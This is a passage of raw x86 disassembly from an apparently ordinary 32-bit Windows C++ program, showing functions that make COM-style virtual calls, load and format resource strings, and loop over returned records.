  4044a8:	mov    BYTE PTR [ebp-0x4],0x3
  4044ac:	lea    ecx,[ebp-0x30]
  4044af:	call   0x4058ac
  4044b4:	test   esi,esi
  4044b6:	jns    0x4044c8
  4044b8:	mov    ecx,esi
  4044ba:	call   0x407454
  4044bf:	mov    BYTE PTR [ebp-0x4],0x1
  4044c3:	jmp    0x4046c2
  4044c8:	mov    DWORD PTR [ebp-0x4],0x2
  4044cf:	mov    edx,DWORD PTR [ebx+0x44]
  4044d2:	mov    ecx,DWORD PTR [ebp-0x18]
  4044d5:	call   0x4070c8
  4044da:	test   eax,eax
  4044dc:	jns    0x404502
  4044de:	mov    ecx,eax
  4044e0:	call   0x407454
  4044e5:	mov    ecx,DWORD PTR [ebp-0x18]
  4044e8:	test   ecx,ecx
  4044ea:	je     0x4044bf
  4044ec:	mov    eax,DWORD PTR [ecx]
  4044ee:	push   ecx
  4044ef:	mov    esi,DWORD PTR [eax+0x8]
  4044f2:	mov    ecx,esi
  4044f4:	call   DWORD PTR ds:0x41228c
  4044fa:	call   esi
  4044fc:	and    DWORD PTR [ebp-0x18],0x0
  404500:	jmp    0x4044bf
  404502:	mov    BYTE PTR [ebp-0x4],0x6
  404506:	mov    eax,DWORD PTR [ebp-0x18]
  404509:	mov    esi,DWORD PTR [eax]
  40450b:	lea    ecx,[ebp-0x34]
  40450e:	push   ecx
  40450f:	lea    ecx,[ebp-0x28]
  404512:	push   ecx
  404513:	push   0x1
  404515:	push   0xffffffff
  404517:	push   eax
  404518:	mov    ecx,DWORD PTR [esi+0x10]
  40451b:	call   DWORD PTR ds:0x41228c
  404521:	call   DWORD PTR [esi+0x10]
  404524:	cmp    eax,0x1
  404527:	je     0x404634
  40452d:	test   eax,eax
  40452f:	js     0x4044de
  404531:	mov    esi,DWORD PTR [ebp-0x2c]
  404534:	inc    esi
  404535:	mov    DWORD PTR [ebp-0x2c],esi
  404538:	mov    DWORD PTR [ebp-0x38],esi
  40453b:	mov    ecx,0x138d
  404540:	call   0x4098dc
  404545:	push   eax
  404546:	lea    eax,[ebp-0x24]
  404549:	push   eax
  40454a:	mov    edx,0x4015b0
  40454f:	mov    ecx,DWORD PTR [ebp-0x28]
  404552:	call   0x4078a4
  404557:	mov    ecx,0x138d
  40455c:	call   0x4098dc
  404561:	push   eax
  404562:	lea    eax,[ebp-0x20]
  404565:	push   eax
  404566:	mov    edx,0x4015c4
  40456b:	mov    ecx,DWORD PTR [ebp-0x28]
  40456e:	call   0x4078a4
  404573:	mov    ecx,DWORD PTR [ebp-0x28]
  404576:	test   ecx,ecx
  404578:	je     0x404591
  40457a:	mov    eax,DWORD PTR [ecx]
  40457c:	push   ecx
  40457d:	mov    esi,DWORD PTR [eax+0x8]
  404580:	mov    ecx,esi
  404582:	call   DWORD PTR ds:0x41228c
  404588:	call   esi
  40458a:	and    DWORD PTR [ebp-0x28],0x0
  40458e:	mov    esi,DWORD PTR [ebp-0x2c]
  404591:	test   edi,edi
  404593:	jne    0x4045c6
  404595:	push   0x1e
  404597:	xor    edx,edx
  404599:	mov    ecx,DWORD PTR [ebx+0x30]
  40459c:	call   0x40b780
  4045a1:	mov    edi,eax
  4045a3:	mov    DWORD PTR [ebp-0x3c],edi
  4045a6:	test   edi,edi
  4045a8:	jne    0x4045bf
  4045aa:	push   0x8000ffff
  4045af:	call   DWORD PTR ds:0x412014
  4045b5:	call   0x4095c0
  4045ba:	jmp    0x4044e5
  4045bf:	mov    ecx,edi
  4045c1:	call   0x40b148
  4045c6:	lea    ecx,[ebp-0x20]
  4045c9:	call   DWORD PTR ds:0x4121b8
  4045cf:	mov    eax,DWORD PTR [eax+0x4]
  4045d2:	test   eax,eax
  4045d4:	je     0x404604
  4045d6:	lea    eax,[ebp-0x20]
  4045d9:	push   eax
  4045da:	push   0x4015dc
  4045df:	lea    eax,[ebp-0x30]
  4045e2:	push   eax
  4045e3:	call   DWORD PTR ds:0x412198
  4045e9:	mov    BYTE PTR [ebp-0x4],0x7
  4045ed:	push   eax
  4045ee:	lea    ecx,[ebp-0x24]
  4045f1:	call   DWORD PTR ds:0x4121a4
  4045f7:	mov    BYTE PTR [ebp-0x4],0x6
  4045fb:	lea    ecx,[ebp-0x30]
  4045fe:	call   DWORD PTR ds:0x4121c0
  404604:	push   DWORD PTR [ebp-0x24]
  404607:	push   esi
  404608:	push   0x6e
  40460a:	pop    ecx
  40460b:	call   0x4098dc
  404610:	push   eax
  404611:	lea    eax,[ebp-0x1c]
  404614:	push   eax
  404615:	call   DWORD PTR ds:0x4121b4
  40461b:	add    esp,0x10
  40461e:	push   ecx
  40461f:	mov    edx,DWORD PTR [ebp-0x1c]
  404622:	mov    ecx,edi
  404624:	call   0x40b1ba
  404629:	xor    eax,eax
  40462b:	inc    eax
  40462c:	cmp    eax,eax
  40462e:	je     0x404506
  404634:	mov    ecx,DWORD PTR [ebp-0x18]
  404637:	test   ecx,ecx
  404639:	je     0x40464f
  40463b:	mov    eax,DWORD PTR [ecx]
  40463d:	push   ecx
  40463e:	mov    esi,DWORD PTR [eax+0x8]
  404641:	mov    ecx,esi
  404643:	call   DWORD PTR ds:0x41228c
  404649:	call   esi
  40464b:	and    DWORD PTR [ebp-0x18],0x0
  40464f:	test   edi,edi
  404651:	je     0x404678
  404653:	mov    eax,DWORD PTR [ebp-0x2c]
  404656:	push   eax
  404657:	push   0x6d
  404659:	pop    ecx
  40465a:	call   0x4098dc
  40465f:	push   eax
  404660:	lea    eax,[ebp-0x1c]
  404663:	push   eax
  404664:	call   DWORD PTR ds:0x4121b4
  40466a:	add    esp,0xc
  40466d:	push   ecx
  40466e:	push   DWORD PTR [ebp-0x1c]
  404671:	mov    ecx,edi
  404673:	call   0x40b42e
  404678:	xor    ebx,ebx
  40467a:	inc    ebx
  40467b:	mov    DWORD PTR [ebp-0x4],ebx
  40467e:	lea    ecx,[ebp-0x20]
  404681:	call   DWORD PTR ds:0x4121c0
  404687:	mov    BYTE PTR [ebp-0x4],0x0
  40468b:	lea    ecx,[ebp-0x24]
  40468e:	call   DWORD PTR ds:0x4121c0
  404694:	or     DWORD PTR [ebp-0x4],0xffffffff
  404698:	lea    ecx,[ebp-0x1c]
  40469b:	call   DWORD PTR ds:0x4121c0
  4046a1:	mov    eax,ebx
  4046a3:	jmp    0x4046e7
  4046a5:	push   0x8007000e
  4046aa:	call   DWORD PTR ds:0x412014
  4046b0:	call   0x4095c0
  4046b5:	mov    eax,0x4046bb
  4046ba:	ret    
  4046bb:	mov    DWORD PTR [ebp-0x4],0x1
  4046c2:	lea    ecx,[ebp-0x20]
  4046c5:	call   DWORD PTR ds:0x4121c0
  4046cb:	mov    BYTE PTR [ebp-0x4],0x0
  4046cf:	lea    ecx,[ebp-0x24]
  4046d2:	call   DWORD PTR ds:0x4121c0
  4046d8:	or     DWORD PTR [ebp-0x4],0xffffffff
  4046dc:	lea    ecx,[ebp-0x1c]
  4046df:	call   DWORD PTR ds:0x4121c0
  4046e5:	xor    eax,eax
  4046e7:	call   0x40ea30
  4046ec:	ret    
  4046ed:	mov    eax,DWORD PTR [ebp-0x40]
  4046f0:	mov    ecx,DWORD PTR [eax+0x4]
  4046f3:	call   0x407454
  4046f8:	mov    eax,0x4046bb
  4046fd:	ret    
  4046fe:	int3   
  4046ff:	int3   
  404700:	int3   
  404701:	int3   
  404702:	int3   
  404703:	push   0x84
  404708:	mov    eax,0x40f032
  40470d:	call   0x40eaf2
  404712:	mov    esi,ecx
  404714:	mov    DWORD PTR [ebp-0x6c],esi
  404717:	lea    ecx,[ebp-0x44]
  40471a:	call   DWORD PTR ds:0x4121c4
  404720:	xor    ebx,ebx
  404722:	mov    DWORD PTR [ebp-0x4],ebx
  404725:	mov    eax,ebx
  404727:	mov    DWORD PTR [ebp-0x64],eax
  40472a:	mov    DWORD PTR [ebp-0x70],ebx
  40472d:	mov    DWORD PTR [ebp-0x84],ebx
  404733:	mov    edi,ebx
  404735:	mov    DWORD PTR [ebp-0x48],ebx
  404738:	mov    DWORD PTR [ebp-0x4c],ebx
  40473b:	mov    DWORD PTR [ebp-0x78],ebx
  40473e:	lea    ecx,[ebp-0x54]
  404741:	call   DWORD PTR ds:0x4121c4
  404747:	xor    eax,eax
  404749:	inc    eax
  40474a:	mov    BYTE PTR [ebp-0x4],al
  40474d:	lea    ecx,[ebp-0x50]
  404750:	call   DWORD PTR ds:0x4121c4
  404756:	mov    BYTE PTR [ebp-0x4],0x2
  40475a:	lea    eax,[esi+0x18]
  40475d:	push   eax
  40475e:	mov    ecx,0x230
  404763:	call   0x4098dc
  404768:	mov    edx,eax
  40476a:	mov    ecx,DWORD PTR [esi+0x14]
  40476d:	call   0x405320
  404772:	mov    BYTE PTR [ebp-0x4],0x3
  404776:	push   0x4015e4
  40477b:	lea    ecx,[ebp-0x58]
  40477e:	call   0x40594b
  404783:	mov    BYTE PTR [ebp-0x4],0x4
  404787:	mov    eax,DWORD PTR [eax]
  404789:	test   eax,eax
  40478b:	je     0x404791
  40478d:	mov    ecx,DWORD PTR [eax]
  40478f:	jmp    0x404793
  404791:	mov    ecx,ebx
  404793:	mov    eax,DWORD PTR [esi+0x10]
  404796:	mov    esi,DWORD PTR [eax]
  404798:	lea    edx,[ebp-0x4c]
  40479b:	push   edx
  40479c:	push   ebx
  40479d:	push   0x30
  40479f:	push   ecx
  4047a0:	push   eax
  4047a1:	mov    ecx,DWORD PTR [esi+0x48]
  4047a4:	call   DWORD PTR ds:0x41228c
  4047aa:	call   DWORD PTR [esi+0x48]
  4047ad:	mov    esi,eax
  4047af:	mov    BYTE PTR [ebp-0x4],0x3
  4047b3:	lea    ecx,[ebp-0x58]
  4047b6:	call   0x4058ac
  4047bb:	test   esi,esi
  4047bd:	jns    0x4047dd
  4047bf:	mov    ecx,esi
  4047c1:	call   0x407454
  4047c6:	xor    eax,eax
  4047c8:	inc    eax
  4047c9:	mov    BYTE PTR [ebp-0x4],al
  4047cc:	lea    ecx,[ebp-0x50]
  4047cf:	call   DWORD PTR ds:0x4121c0
  4047d5:	mov    BYTE PTR [ebp-0x4],bl
  4047d8:	jmp    0x404db9
  4047dd:	mov    DWORD PTR [ebp-0x4],0x2
  4047e4:	mov    edx,DWORD PTR [ebp-0x6c]
  4047e7:	mov    edx,DWORD PTR [edx+0x44]
  4047ea:	mov    ecx,DWORD PTR [ebp-0x4c]
  4047ed:	call   0x4070c8
  4047f2:	test   eax,eax
  4047f4:	jns    0x404819
  4047f6:	mov    ecx,eax
  4047f8:	call   0x407454
  4047fd:	mov    ecx,DWORD PTR [ebp-0x4c]
  404800:	test   ecx,ecx
  404802:	je     0x4047c6
  404804:	mov    eax,DWORD PTR [ecx]
  404806:	push   ecx
  404807:	mov    esi,DWORD PTR [eax+0x8]
  40480a:	mov    ecx,esi
  40480c:	call   DWORD PTR ds:0x41228c
  404812:	call   esi
  404814:	mov    DWORD PTR [ebp-0x4c],ebx
  404817:	jmp    0x4047c6
  404819:	mov    BYTE PTR [ebp-0x4],0x6
  40481d:	mov    eax,DWORD PTR [ebp-0x4c]
  404820:	mov    esi,DWORD PTR [eax]
  404822:	lea    ecx,[ebp-0x84]
  404828:	push   ecx
  404829:	lea    ecx,[ebp-0x48]
  40482c:	push   ecx
  40482d:	push   0x1
  40482f:	push   0xffffffff
  404831:	push   eax
  404832:	mov    ecx,DWORD PTR [esi+0x10]
  404835:	call   DWORD PTR ds:0x41228c
  40483b:	call   DWORD PTR [esi+0x10]
  40483e:	cmp    eax,0x1
  404841:	je     0x404ceb
  404847:	test   eax,eax
  404849:	js     0x4047f6
  40484b:	push   ecx
  40484c:	lea    eax,[ebp-0x78]
  40484f:	push   eax
  404850:	mov    edx,0x401610
  404855:	mov    ecx,DWORD PTR [ebp-0x48]
  404858:	call   0x40799a
  40485d:	mov    esi,0x138d
  404862:	mov    ecx,esi
  404864:	call   0x4098dc
  404869:	push   eax
  40486a:	lea    eax,[ebp-0x50]
  40486d:	push   eax
  40486e:	mov    edx,0x40161c
  404873:	mov    ecx,DWORD PTR [ebp-0x48]
  404876:	call   0x4078a4
  40487b:	mov    ecx,esi
  40487d:	call   0x4098dc
  404882:	push   eax
  404883:	lea    eax,[ebp-0x54]
  404886:	push   eax
  404887:	mov    edx,0x401634
  40488c:	mov    ecx,DWORD PTR [ebp-0x48]
  40488f:	call   0x4078a4
  404894:	push   ecx
  404895:	lea    eax,[ebp-0x70]
  404898:	push   eax
  404899:	mov    edx,0x401654
  40489e:	mov    ecx,DWORD PTR [ebp-0x48]
  4048a1:	call   0x40799a
  4048a6:	mov    DWORD PTR [ebp-0x58],eax
  4048a9:	mov    ecx,DWORD PTR [ebp-0x48]
  4048ac:	test   ecx,ecx
  4048ae:	je     0x4048c6
  4048b0:	mov    eax,DWORD PTR [ecx]
  4048b2:	push   ecx
  4048b3:	mov    esi,DWORD PTR [eax+0x8]
  4048b6:	mov    ecx,esi
  4048b8:	call   DWORD PTR ds:0x41228c
  4048be:	call   esi
  4048c0:	mov    DWORD PTR [ebp-0x48],ebx
  4048c3:	mov    eax,DWORD PTR [ebp-0x58]
  4048c6:	mov    esi,DWORD PTR [ebp-0x70]
  4048c9:	test   eax,eax
  4048cb:	je     0x4048d5
  4048cd:	test   esi,esi
  4048cf:	je     0x404ce0
  4048d5:	mov    eax,DWORD PTR [ebp-0x64]
  4048d8:	inc    eax
  4048d9:	mov    DWORD PTR [ebp-0x64],eax
  4048dc:	mov    DWORD PTR [ebp-0x90],eax
  4048e2:	test   edi,edi
  4048e4:	jne    0x404920
  4048e6:	push   0x1f
  4048e8:	xor    edx,edx
  4048ea:	mov    eax,DWORD PTR [ebp-0x6c]
  4048ed:	mov    ecx,DWORD PTR [eax+0x30]
  4048f0:	call   0x40b780
  4048f5:	mov    edi,eax
  4048f7:	mov    DWORD PTR [ebp-0x88],edi
  4048fd:	test   edi,edi
  4048ff:	jne    0x404916
  404901:	push   0x8000ffff
  404906:	call   DWORD PTR ds:0x412014
  40490c:	call   0x4095c0
  404911:	jmp    0x4047fd
  404916:	mov    ecx,edi
  404918:	call   0x40b148
  40491d:	mov    eax,DWORD PTR [ebp-0x64]
  404920:	push   DWORD PTR [ebp-0x50]
  404923:	push   eax
  404924:	push   0x6c
  404926:	pop    ecx
  404927:	call   0x4098dc
  40492c:	push   eax
  40492d:	lea    eax,[ebp-0x44]
  404930:	push   eax
  404931:	call   DWORD PTR ds:0x4121b4
  404937:	add    esp,0x10
  40493a:	push   ecx
  40493b:	mov    edx,DWORD PTR [ebp-0x44]
  40493e:	mov    ecx,edi
  404940:	call   0x40b1ba
  404945:	cmp    DWORD PTR [ebp-0x58],0x1
  404949:	jne    0x404ce0
  40494f:	push   DWORD PTR [ebp-0x54]
  404952:	push   0x74
  404954:	pop    ecx
  404955:	call   0x4098dc
  40495a:	push   eax
  40495b:	lea    eax,[ebp-0x44]
  40495e:	push   eax
  40495f:	call   DWORD PTR ds:0x4121b4
  404965:	add    esp,0xc
  404968:	push   ecx
  404969:	mov    edx,DWORD PTR [ebp-0x44]
  40496c:	mov    ecx,edi
  40496e:	call   0x40b1ba
  404973:	cmp    esi,0x2
  404976:	je     0x404acd
  40497c:	mov    ecx,0x8a
  404981:	call   0x4098dc
  404986:	push   eax
  404987:	lea    ecx,[ebp-0x40]
  40498a:	call   DWORD PTR ds:0x412194
  404990:	mov    BYTE PTR [ebp-0x4],0x7
  404994:	mov    ecx,0x8b
  404999:	call   0x4098dc
  40499e:	push   eax
  40499f:	lea    ecx,[ebp-0x3c]
  4049a2:	call   DWORD PTR ds:0x412194
  4049a8:	mov    BYTE PTR [ebp-0x4],0x8
  4049ac:	mov    ecx,0x8c
  4049b1:	call   0x4098dc
  4049b6:	push   eax
  4049b7:	lea    ecx,[ebp-0x38]
  4049ba:	call   DWORD PTR ds:0x412194
  4049c0:	mov    BYTE PTR [ebp-0x4],0x9
  4049c4:	mov    ecx,0x8d
  4049c9:	call   0x4098dc
  4049ce:	push   eax
  4049cf:	lea    ecx,[ebp-0x34]
  4049d2:	call   DWORD PTR ds:0x412194
  4049d8:	mov    BYTE PTR [ebp-0x4],0xa
  4049dc:	mov    ecx,0x8e
  4049e1:	call   0x4098dc
  4049e6:	push   eax
  4049e7:	lea    ecx,[ebp-0x30]
  4049ea:	call   DWORD PTR ds:0x412194
  4049f0:	mov    BYTE PTR [ebp-0x4],0xb
  4049f4:	mov    ecx,0x8f
  4049f9:	call   0x4098dc
  4049fe:	push   eax
  4049ff:	lea    ecx,[ebp-0x2c]
  404a02:	call   DWORD PTR ds:0x412194
  404a08:	mov    BYTE PTR [ebp-0x4],0xc
  404a0c:	mov    ecx,0x90
  404a11:	call   0x4098dc
  404a16:	push   eax
  404a17:	lea    ecx,[ebp-0x28]
  404a1a:	call   DWORD PTR ds:0x412194
  404a20:	mov    BYTE PTR [ebp-0x4],0xd
  404a24:	mov    ecx,0x91
  404a29:	call   0x4098dc
  404a2e:	push   eax
  404a2f:	lea    ecx,[ebp-0x24]
  404a32:	call   DWORD PTR ds:0x412194
  404a38:	mov    BYTE PTR [ebp-0x4],0xe
  404a3c:	mov    ecx,0x92
  404a41:	call   0x4098dc
  404a46:	push   eax
  404a47:	lea    ecx,[ebp-0x20]
  404a4a:	call   DWORD PTR ds:0x412194
  404a50:	mov    BYTE PTR [ebp-0x4],0xf
  404a54:	mov    ecx,0x93
  404a59:	call   0x4098dc
  404a5e:	push   eax
  404a5f:	lea    ecx,[ebp-0x1c]
  404a62:	call   DWORD PTR ds:0x412194
  404a68:	mov    BYTE PTR [ebp-0x4],0x10
  404a6c:	mov    ecx,0x94
  404a71:	call   0x4098dc
  404a76:	push   eax
  404a77:	lea    ecx,[ebp-0x18]
  404a7a:	call   DWORD PTR ds:0x412194
  404a80:	mov    BYTE PTR [ebp-0x4],0x11
  404a84:	lea    eax,[esi-0x1]
  404a87:	cmp    eax,0x9
  404a8a:	ja     0x404ab1
  404a8c:	push   DWORD PTR [ebp+esi*4-0x40]
  404a90:	push   0x73
  404a92:	pop    ecx
  404a93:	call   0x4098dc
  404a98:	push   eax
  404a99:	lea    eax,[ebp-0x44]
  404a9c:	push   eax
  404a9d:	call   DWORD PTR ds:0x4121b4
  404aa3:	add    esp,0xc
  404aa6:	push   ecx
  404aa7:	mov    edx,DWORD PTR [ebp-0x44]
  404aaa:	mov    ecx,edi
  404aac:	call   0x40b1ba
  404ab1:	mov    BYTE PTR [ebp-0x4],0x6
  404ab5:	push   DWORD PTR ds:0x4121c0
  404abb:	push   0xb
  404abd:	push   0x4
  404abf:	lea    eax,[ebp-0x40]
  404ac2:	push   eax
  404ac3:	call   0x40e307
  404ac8:	jmp    0x404ce0
  404acd:	lea    ecx,[ebp-0x68]
  404ad0:	call   DWORD PTR ds:0x4121c4
  404ad6:	mov    BYTE PTR [ebp-0x4],0x12
  404ada:	lea    ecx,[ebp-0x60]
  404add:	call   DWORD PTR ds:0x4121c4
  404ae3:	mov    BYTE PTR [ebp-0x4],0x13
  404ae7:	mov    DWORD PTR [ebp-0x74],ebx
  404aea:	mov    DWORD PTR [ebp-0x5c],ebx
  404aed:	call   0x40b124
  404af2:	mov    DWORD PTR [ebp-0x5c],eax
  404af5:	test   eax,eax
  404af7:	jne    0x404b3c
  404af9:	mov    ecx,0x8007000e
  404afe:	call   0x407454
  404b03:	mov    ecx,DWORD PTR [ebp-0x4c]
  404b06:	test   ecx,ecx
  404b08:	je     0x404b1d
  404b0a:	mov    eax,DWORD PTR [ecx]
  404b0c:	push   ecx
  404b0d:	mov    esi,DWORD PTR [eax+0x8]
  404b10:	mov    ecx,esi
  404b12:	call   DWORD PTR ds:0x41228c
  404b18:	call   esi
  404b1a:	mov    DWORD PTR [ebp-0x4c],ebx
  404b1d:	mov    BYTE PTR [ebp-0x4],0x12
  404b21:	lea    ecx,[ebp-0x60]
  404b24:	call   DWORD PTR ds:0x4121c0
  404b2a:	mov    BYTE PTR [ebp-0x4],0x6
  404b2e:	lea    ecx,[ebp-0x68]
  404b31:	call   DWORD PTR ds:0x4121c0
  404b37:	jmp    0x4047c6
  404b3c:	push   DWORD PTR [ebp-0x78]
  404b3f:	push   0x401680
  404b44:	lea    eax,[ebp-0x44]
  404b47:	push   eax
  404b48:	call   DWORD PTR ds:0x4121b4
  404b4e:	add    esp,0xc
  404b51:	push   DWORD PTR [ebp-0x44]
  404b54:	lea    ecx,[ebp-0x80]
  404b57:	call   0x40594b
  404b5c:	mov    BYTE PTR [ebp-0x4],0x14
  404b60:	mov    eax,DWORD PTR [eax]
  404b62:	test   eax,eax
  404b64:	je     0x404b6a
  404b66:	mov    ecx,DWORD PTR [eax]
  404b68:	jmp    0x404b6c
  404b6a:	mov    ecx,ebx
  404b6c:	mov    eax,DWORD PTR [ebp-0x6c]
  404b6f:	mov    eax,DWORD PTR [eax+0x10]
  404b72:	mov    esi,DWORD PTR [eax]
  404b74:	push   ebx
  404b75:	lea    edx,[ebp-0x48]
  404b78:	push   edx
  404b79:	push   ebx
  404b7a:	push   ebx
  404b7b:	push   ecx
  404b7c:	push   eax
  404b7d:	mov    ecx,DWORD PTR [esi+0x18]
  404b80:	call   DWORD PTR ds:0x41228c
  404b86:	call   DWORD PTR [esi+0x18]
  404b89:	mov    esi,eax
  404b8b:	mov    BYTE PTR [ebp-0x4],0x13
  404b8f:	lea    ecx,[ebp-0x80]
  404b92:	call   0x4058ac
  404b97:	test   esi,esi
  404b99:	js     0x404ca4
  404b9f:	push   DWORD PTR [ebp-0x5c]
  404ba2:	mov    ecx,DWORD PTR [ebp-0x48]
  404ba5:	call   0x407787
  404baa:	mov    ecx,0x138d
  404baf:	call   0x4098dc
  404bb4:	push   eax
  404bb5:	lea    eax,[ebp-0x60]
  404bb8:	push   eax
  404bb9:	mov    edx,0x4016ec
  404bbe:	mov    ecx,DWORD PTR [ebp-0x48]
  404bc1:	call   0x4078a4
  404bc6:	push   ecx
  404bc7:	lea    eax,[ebp-0x74]
  404bca:	push   eax
  404bcb:	mov    edx,0x401704
  404bd0:	mov    ecx,DWORD PTR [ebp-0x48]
  404bd3:	call   0x40799a
  404bd8:	push   0x6f
  404bda:	pop    ecx
  404bdb:	call   0x4098dc
  404be0:	push   eax
  404be1:	lea    ecx,[ebp-0x68]
  404be4:	call   DWORD PTR ds:0x4121b0
  404bea:	cmp    DWORD PTR [ebp-0x74],0xffffffff
  404bee:	mov    ecx,0x88
  404bf3:	je     0x404bf6
  404bf5:	inc    ecx
  404bf6:	call   0x4098dc
  404bfb:	push   eax
  404bfc:	push   DWORD PTR [ebp-0x68]
  404bff:	lea    eax,[ebp-0x44]
  404c02:	push   eax
  404c03:	call   DWORD PTR ds:0x4121b4
  404c09:	add    esp,0xc
  404c0c:	push   ecx
  404c0d:	mov    edx,DWORD PTR [ebp-0x44]
  404c10:	mov    ecx,edi
  404c12:	call   0x40b1ba
  404c17:	cmp    DWORD PTR [ebp-0x74],0xffffffff
  404c1b:	jne    0x404c41
  404c1d:	push   DWORD PTR [ebp-0x60]
  404c20:	push   0x70
  404c22:	pop    ecx
  404c23:	call   0x4098dc
  404c28:	push   eax
  404c29:	lea    eax,[ebp-0x44]
  404c2c:	push   eax
  404c2d:	call   DWORD PTR ds:0x4121b4
  404c33:	add    esp,0xc
  404c36:	push   ecx
  404c37:	mov    edx,DWORD PTR [ebp-0x44]
  404c3a:	mov    ecx,edi
  404c3c:	call   0x40b1ba
  404c41:	push   ecx
  404c42:	push   0x71
  404c44:	pop    ecx
  404c45:	call   0x4098dc
  404c4a:	mov    edx,eax
  404c4c:	mov    ecx,edi
  404c4e:	call   0x40b1ba
  404c53:	mov    ecx,DWORD PTR [ebp-0x5c]
  404c56:	call   0x40b4f1
  404c5b:	mov    DWORD PTR [ebp-0x58],eax
  404c5e:	mov    esi,ebx
  404c60:	mov    DWORD PTR [ebp-0x7c],esi
  404c63:	cmp    esi,eax
  404c65:	jae    0x404ca4
  404c67:	mov    edx,esi
  404c69:	call   0x40b557
  404c6e:	test   eax,eax
  404c70:	je     0x404c98
  404c72:	push   eax
  404c73:	lea    eax,[esi+0x1]
  404c76:	push   eax
  404c77:	push   0x72
  404c79:	pop    ecx
  404c7a:	call   0x4098dc
  404c7f:	push   eax
  404c80:	lea    eax,[ebp-0x44]
  404c83:	push   eax
  404c84:	call   DWORD PTR ds:0x4121b4
  404c8a:	add    esp,0x10
  404c8d:	push   ecx
  404c8e:	mov    edx,DWORD PTR [ebp-0x44]
  404c91:	mov    ecx,edi
  404c93:	call   0x40b1ba
  404c98:	inc    esi
  404c99:	mov    DWORD PTR [ebp-0x7c],esi
  404c9c:	mov    ecx,DWORD PTR [ebp-0x5c]
  404c9f:	mov    eax,DWORD PTR [ebp-0x58]
  404ca2:	jmp    0x404c63
  404ca4:	mov    ecx,DWORD PTR [ebp-0x48]
  404ca7:	test   ecx,ecx
  404ca9:	je     0x404cbe
  404cab:	mov    eax,DWORD PTR [ecx]
  404cad:	push   ecx
  404cae:	mov    esi,DWORD PTR [eax+0x8]
  404cb1:	mov    ecx,esi
  404cb3:	call   DWORD PTR ds:0x41228c
  404cb9:	call   esi
  404cbb:	mov    DWORD PTR [ebp-0x48],ebx
  404cbe:	lea    ecx,[ebp-0x5c]
  404cc1:	call   0x40b196
  404cc6:	mov    BYTE PTR [ebp-0x4],0x12
  404cca:	lea    ecx,[ebp-0x60]
  404ccd:	call   DWORD PTR ds:0x4121c0
  404cd3:	mov    BYTE PTR [ebp-0x4],0x6
  404cd7:	lea    ecx,[ebp-0x68]
  404cda:	call   DWORD PTR ds:0x4121c0
  404ce0:	xor    esi,esi
  404ce2:	inc    esi
  404ce3:	cmp    esi,esi
  404ce5:	je     0x40481d
  404ceb:	mov    ecx,DWORD PTR [ebp-0x4c]
  404cee:	test   ecx,ecx
  404cf0:	je     0x404d05
  404cf2:	mov    eax,DWORD PTR [ecx]
  404cf4:	push   ecx
  404cf5:	mov    esi,DWORD PTR [eax+0x8]
  404cf8:	mov    ecx,esi
  404cfa:	call   DWORD PTR ds:0x41228c
  404d00:	call   esi
  404d02:	mov    DWORD PTR [ebp-0x4c],ebx
  404d05:	test   edi,edi
  404d07:	je     0x404d2e
  404d09:	mov    eax,DWORD PTR [ebp-0x64]
  404d0c:	push   eax
  404d0d:	push   0x6b
  404d0f:	pop    ecx
  404d10:	call   0x4098dc
  404d15:	push   eax
  404d16:	lea    eax,[ebp-0x44]
  404d19:	push   eax
  404d1a:	call   DWORD PTR ds:0x4121b4
  404d20:	add    esp,0xc
  404d23:	push   ecx
  404d24:	push   DWORD PTR [ebp-0x44]
  404d27:	mov    ecx,edi
  404d29:	call   0x40b42e
  404d2e:	xor    eax,eax
  404d30:	inc    eax
  404d31:	mov    DWORD PTR [ebp-0x4],eax
  404d34:	lea    ecx,[ebp-0x50]
  404d37:	call   DWORD PTR ds:0x4121c0
  404d3d:	mov    BYTE PTR [ebp-0x4],bl
  404d40:	lea    ecx,[ebp-0x54]
  404d43:	call   DWORD PTR ds:0x4121c0
  404d49:	or     DWORD PTR [ebp-0x4],0xffffffff
  404d4d:	lea    ecx,[ebp-0x44]
  404d50:	call   DWORD PTR ds:0x4121c0
  404d56:	xor    eax,eax
  404d58:	inc    eax
  404d59:	jmp    0x404dd1
  404d5b:	mov    ecx,0x8007000e
  404d60:	call   0x407454
  404d65:	mov    ecx,DWORD PTR [ebp-0x48]
  404d68:	test   ecx,ecx
  404d6a:	je     0x404d83
  404d6c:	mov    eax,DWORD PTR [ecx]
  404d6e:	push   ecx
  404d6f:	mov    esi,DWORD PTR [eax+0x8]
  404d72:	mov    ecx,esi
  404d74:	call   DWORD PTR ds:0x41228c
  404d7a:	call   esi
  404d7c:	xor    ebx,ebx
  404d7e:	mov    DWORD PTR [ebp-0x48],ebx
  404d81:	jmp    0x404d85
  404d83:	xor    ebx,ebx
  404d85:	mov    ecx,DWORD PTR [ebp-0x4c]
  404d88:	test   ecx,ecx
  404d8a:	je     0x404d9f
  404d8c:	mov    eax,DWORD PTR [ecx]
  404d8e:	push   ecx
  404d8f:	mov    esi,DWORD PTR [eax+0x8]
  404d92:	mov    ecx,esi
  404d94:	call   DWORD PTR ds:0x41228c
  404d9a:	call   esi
  404d9c:	mov    DWORD PTR [ebp-0x4c],ebx
  404d9f:	mov    eax,0x404da5
  404da4:	ret    
  404da5:	mov    DWORD PTR [ebp-0x4],0x1
  404dac:	lea    ecx,[ebp-0x50]
  404daf:	call   DWORD PTR ds:0x4121c0
  404db5:	mov    BYTE PTR [ebp-0x4],0x0
  404db9:	lea    ecx,[ebp-0x54]
  404dbc:	call   DWORD PTR ds:0x4121c0
  404dc2:	or     DWORD PTR [ebp-0x4],0xffffffff
  404dc6:	lea    ecx,[ebp-0x44]
  404dc9:	call   DWORD PTR ds:0x4121c0
  404dcf:	xor    eax,eax
  404dd1:	call   0x40ea30
  404dd6:	ret    
  404dd7:	mov    eax,DWORD PTR [ebp-0x8c]
  404ddd:	mov    ecx,DWORD PTR [eax+0x4]
  404de0:	call   0x407454
  404de5:	mov    eax,0x404da5
  404dea:	ret    
  404deb:	int3   
  404dec:	int3   
  404ded:	int3   
  404dee:	int3   
  404def:	int3   
  404df0:	push   0xc
  404df2:	mov    eax,0x40f068
  404df7:	call   0x40ea7c
  404dfc:	mov    ebx,ecx
  404dfe:	lea    ecx,[ebp-0x18]
  404e01:	call   DWORD PTR ds:0x4121c4
  404e07:	xor    edi,edi
  404e09:	mov    DWORD PTR [ebp-0x4],edi
  404e0c:	lea    eax,[ebx+0x18]
  404e0f:	push   eax
  404e10:	mov    ecx,0x231
  404e15:	mov    DWORD PTR [ebp-0x14],edi
  404e18:	call   0x4098dc
  404e1d:	mov    ecx,DWORD PTR [ebx+0x14]
